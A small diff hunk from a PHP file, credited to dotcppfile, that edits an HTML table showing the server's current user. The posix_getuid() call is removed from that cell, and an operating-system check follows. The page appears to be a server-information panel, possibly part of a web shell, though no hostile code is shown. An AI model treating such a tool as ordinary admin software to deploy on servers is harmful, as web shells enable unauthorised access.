@@ -523,7 +523,7 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 
 	<tr>
 		<td>Current User</td>
-		<td>".get_current_user()." | ".posix_getuid()."</td>
+		<td>".get_current_user()."</td>
 	</tr>";
 
 	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
